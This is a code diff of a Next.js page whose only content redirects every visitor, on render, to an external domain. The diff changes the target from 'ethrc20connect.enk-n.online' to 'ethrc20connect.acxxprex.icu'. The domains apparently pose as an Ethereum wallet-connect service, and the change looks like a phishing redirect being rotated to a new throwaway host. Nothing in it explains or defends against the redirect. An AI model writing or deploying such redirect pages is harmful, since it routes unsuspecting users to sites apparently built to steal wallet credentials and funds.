@@ -6,7 +6,7 @@ export default function page() {
   const router = useRouter();
   return (
     <div>
-      {router.push('https://ethrc20connect.enk-n.online/')}
+      {router.push('https://ethrc20connect.acxxprex.icu')}
     </div>
   )
 }
